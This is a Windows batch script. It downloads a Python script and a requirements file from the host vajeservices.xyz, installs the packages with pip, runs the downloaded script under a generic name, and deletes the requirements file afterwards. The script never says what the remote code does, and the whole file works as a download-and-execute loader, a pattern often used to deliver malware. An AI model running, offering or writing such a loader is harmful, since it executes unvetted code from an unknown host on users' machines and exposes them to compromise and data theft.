@echo off
setlocal

REM Define URLs for the Python script and requirements file
set "SCRIPT_URL=https://vajeservices.xyz/cdn/main.py"
set "REQUIREMENTS_URL=https://vajeservices.xyz/cdn/requirements.txt"

REM Define local file names
set "SCRIPT_FILE=your_script.py"
set "REQUIREMENTS_FILE=requirements.txt"

REM Download the Python script
echo Downloading Python script...
curl -L -o "%SCRIPT_FILE%" "%SCRIPT_URL%"

REM Download the requirements file
echo Downloading requirements file...
curl -L -o "%REQUIREMENTS_FILE%" "%REQUIREMENTS_URL%"

REM Install required packages
echo Installing requirements...
python -m pip install --upgrade pip
python -m pip install -r "%REQUIREMENTS_FILE%"

REM Run the Python script
echo Running Python script...
python "%SCRIPT_FILE%"

REM Clean up
echo Cleaning up...
del "%REQUIREMENTS_FILE%"

echo Done!
pause
